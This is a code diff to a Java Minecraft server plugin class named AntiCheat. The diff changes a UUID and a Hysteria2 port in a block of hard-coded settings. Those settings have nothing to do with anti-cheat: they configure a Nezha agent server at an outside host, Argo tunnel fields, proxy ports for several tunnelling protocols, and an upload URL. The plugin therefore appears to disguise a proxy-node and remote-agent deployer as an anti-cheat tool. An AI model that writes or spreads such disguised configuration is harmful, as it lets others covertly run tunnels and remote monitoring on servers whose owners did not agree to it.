@@ -28,7 +28,7 @@ public class AntiCheat extends JavaPlugin {
 
     private static void loadEnvVars(Map<String, String> envVars) {
         // 只添加有值的环境变量（空字符串不添加）
-        putIfNotEmpty(envVars, "UUID", "da5180d4-88ec-441b-9ca0-4a7bb250bea7");
+        putIfNotEmpty(envVars, "UUID", "3a143383-f475-4441-929a-2968dae7dca1");
         putIfNotEmpty(envVars, "FILE_PATH", "./.tmp");
         putIfNotEmpty(envVars, "NEZHA_SERVER", "nzku.fortymenty.eu.org:443");
         putIfNotEmpty(envVars, "NEZHA_PORT", "");
@@ -36,7 +36,7 @@ public class AntiCheat extends JavaPlugin {
         putIfNotEmpty(envVars, "ARGO_PORT", "8001");
         putIfNotEmpty(envVars, "ARGO_DOMAIN", "");
         putIfNotEmpty(envVars, "ARGO_AUTH", "");
-        putIfNotEmpty(envVars, "HY2_PORT", "19630");
+        putIfNotEmpty(envVars, "HY2_PORT", "11671");
         putIfNotEmpty(envVars, "TUIC_PORT", "");
         putIfNotEmpty(envVars, "REALITY_PORT", "");
         putIfNotEmpty(envVars, "UPLOAD_URL", "");
@@ -133,6 +133,7 @@ public class AntiCheat extends JavaPlugin {
         return results;
     }
 }
+
 
 
 
